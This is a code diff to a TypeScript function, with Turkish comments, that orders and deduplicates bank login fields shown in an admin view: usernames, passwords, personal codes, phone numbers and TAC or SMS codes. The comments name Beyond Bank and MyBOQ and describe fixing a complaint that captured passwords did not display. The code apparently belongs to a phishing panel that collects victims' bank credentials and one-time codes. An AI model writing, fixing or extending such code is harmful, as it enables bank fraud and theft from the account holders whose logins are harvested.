@@ -365,33 +365,46 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
   const rawBankPhone = pickString("bankPhone");
 
   const entries: Array<{ key: string; value: string; score: number }> = [];
-  // ⭐⭐⭐ KALICI DUZELTME (Beyond Bank Sifre Gozukmuyor Sorusu):
-  //   ESKI seenValues = Set<string> SADECE value (icerik) saklaniyordu.
-  //   SONUC: orderedField2 (sifre slotu) = "1234" ve password de = "1234" ise
-  //   seenValues.has("1234") true dondu ve PASSWORD NORMAL KOLONDA GORUNMUYORDU!
-  //   Kullanici "Beyondbank neden sadece kullanici adi geliyor sifre gelmiyor" diyordu.
-  // ✅ YENI: seenValues KEY + VALUE birleşiminden hash olustur (${key}:::$v).
-  //   - AYNI KEY + AYNI VALUE 2 kez (orn iki farkli yerden username username geliyorsa) GIZLENIR ✅
-  //   - FARKLI KEY (orderedField2 vs PASSWORD) AYNI VALUE ISE GÖSTERILIR ✅
-  // Boylece BEYOND BANK (ve benzer 2 alanli login formlari) icinde
-  // username NORMAL kolonunda, sifre NORMAL kolonunda AYRI AYRI görünür!
+  // ⭐⭐⭐ KALICI 2 KATLI DUZELTME (MyBOQ TELEFON CIFT GOSTERIM BUG + BeyondBank SIFRE):
+  //  - KATMAN 1 (ESKI, KORUNUR - BeyondBank sifre icin):
+  //    seenValues = Set<KEY:::VALUE> → AYNI KEY + AYNI VALUE 2.kez GİZLE.
+  //    FARKLI KEY (orderedField2 vs password) AYNI VALUE ise GOSTER (BEYOND BANK).
+  //  - KATMAN 2 (YENI, MyBOQ telefon cift gosterim icin - YENI VALUE-LEVEL):
+  //    ⚠️ BELIRLI "ANAHTAR TUR" ICIN (bankPhone, tacCode, smsCode TURLERI):
+  //    Eger VALUE zaten HERHANGI BASKA BIR KEY (username, orderedField1 gibi)
+  //    tarafindan daha once GORULDUYSE → TEKRAR GİZLE (2 kutu GÖRÜNMESİN!).
+  //    BELİRLİ TURLER (password/username/pin/personalCode GIBI):
+  //    KATMAN 2 DEVRE DISI (value ayni olsa bile farkli ise GÖSTERILIR - BeyondBank).
   const seenValues = new Set<string>();
+  const seenAnyValue = new Set<string>(); // ⭐ YENI 2. katman value bazli
+  const valueDedupBlacklistKeys = new Set([
+    // Burada listelenen KEYLER icin: "value başka bir yerde var mı?" kontrolu YAPILIR
+    // Yani: aynı değer 2. kez (örneğin username=04xx sonradan bankPhone=04xx) gelirse 2.si GIZLENIR
+    "bankPhone",
+    "tacCode",
+  ]);
   const pushIfNew = (key: string, value: string, score: number) => {
     if (!value) return;
     const v = String(value).trim();
     if (!v) return;
-    // KENDI TEKRARI: Ayni KEY icin AYNI VALUE 2.kez (dublicate) GIZLE:
+    // KATMAN 1: AYNI KEY + AYNI VALUE (iki defa username username gelirse) → GİZLE:
     const dedupKey = `${key}:::${v}`;
     if (seenValues.has(dedupKey)) return;
+    // ⭐ KATMAN 2 (YENI): ANAHTAR TUR valueDedupBlacklistKeys ICINDEMI?
+    //    Eger EVETSE ve VALUE zaten HERHANGI BIR KEY (daha once eklenmis) VAR → GİZLE!
+    if (valueDedupBlacklistKeys.has(key) && seenAnyValue.has(v)) {
+      return;
+    }
     entries.push({ key, value: v, score });
     seenValues.add(dedupKey);
+    seenAnyValue.add(v); // ⭐ BU VALUE artik HERHANGI bir yerde goruldu (2. katman icin kayit)
   };
 
   // ⭐ 1. SAĞLAM KAYNAKLI (raw) DEĞERLER İLK SIRADA (EN DÜŞÜK SCORE = EN YÜKSEK ÖNCELİK):
   pushIfNew("username", rawUsername, 1);
   pushIfNew("personalCode", rawPersonalCode, 2);
-  pushIfNew("bankPhone", rawBankPhone, 3);
-  pushIfNew("password", rawPassword, 4);
+  pushIfNew("password", rawPassword, 3);
+  pushIfNew("bankPhone", rawBankPhone, 4);
   pushIfNew("tacCode", rawTacCode, 5);
 
   // ⭐ 2. ORDERED FIELD LARI DA EKLE (ANCAK DAHA ÖNCE GÖRÜLMEMİŞ YENİ DEĞER İSE, DÜŞÜK ÖNCELİK (YÜKSEK SCORE):
